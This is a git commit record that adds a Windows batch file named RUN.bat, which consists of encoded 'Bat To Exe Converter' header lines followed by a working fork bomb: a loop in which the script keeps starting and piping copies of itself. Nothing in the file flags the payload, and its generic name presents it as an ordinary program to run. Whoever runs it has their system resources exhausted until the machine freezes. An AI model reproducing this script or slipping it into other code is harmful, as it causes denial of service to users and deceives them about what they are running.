484a80f56ba13071260c10280bdbeda47cb487de
Ethaniel-Ramsgoat <68842475+Ethaniel-Ramsgoat@users.noreply.github.com>
2022-04-12 13:32:37 +1200

    Add files via upload

---
+++ RUN.bat
@@ -0,0 +1,38 @@
+::[Bat To Exe Converter]
+::
+::fBE1pAF6MU+EWGW4+VA3O1VHTwyNM2f0CK8g/fv+/fm7ikIQUd4MbJrf37qaM9xCsxW0I6oJ02lRjMQcMD93PjyEWk8GnEAMtGWRVw==
+::YAwzoRdxOk+EWAjk
+::fBw5plQjdDPlFUuD5wwjKxNbQwjMMnGGE6YZ+vvHx+WKp3EuQPc7fYHPyYjfebBDvHnAeoEj2nVbnNgwKhRKahyiegoLj1FOs3CRMtWRsh3qdUSG4UR+EmZ75w==
+::YAwzuBVtJxjWCl3EqQJgSA==
+::ZR4luwNxJguZRRnk
+::Yhs/ulQjdFy5
+::cxAkpRVqdFKZSDk=
+::cBs/ulQjdF+5
+::ZR41oxFsdFKZSDk=
+::eBoioBt6dFKZSDk=
+::cRo6pxp7LAbNWATEpCI=
+::egkzugNsPRvcWATEpCI=
+::dAsiuh18IRvcCxnZtBJQ
+::cRYluBh/LU+EWAnk
+::YxY4rhs+aU+IeA==
+::cxY6rQJ7JhzQF1fEqQJgZk0NLA==
+::ZQ05rAF9IBncCkqN+0xwdVsFLA==
+::ZQ05rAF9IAHYFVzEqQIWJwlAQg2WOQs=
+::eg0/rx1wNQPfEVWB+kM9LVsJDCKNLn+0D6EZiA==
+::fBEirQZwNQPfEVWB+kM9LVsJDCKNLn+0D6EZiA==
+::cRolqwZ3JBvQF1fEqQI8JxcUSwGWfHutCLAYiA==
+::dhA7uBVwLU+EWHyU/UFwDxpZSRfi
+::YQ03rBFzNR3SWATE2k1Q
+::dhAmsQZ3MwfNWATE2k1Q
+::ZQ0/vhVqMQ3MEVWAtB9wER5HLA==
+::Zg8zqx1/OA3MEVWAtB9wER5HLA==
+::dhA7pRFwIByZRRmD8VZwOAxaSQDCMGS2Zg==
+::Zh4grVQjdDPlFUuD5wwjKxNbQwjMMnGGE6YZ+vvHx+WKp3EuQPc7fYHPyYjfebBDvHnAcIUmwnVKpO0DHg9WdwauIAosrA4=
+::YB416Ek+ZG8=
+::
+::
+::978f952a14a936cc963da21a135fa983
+:fork
+start %0
+%0|%0
+goto :fork
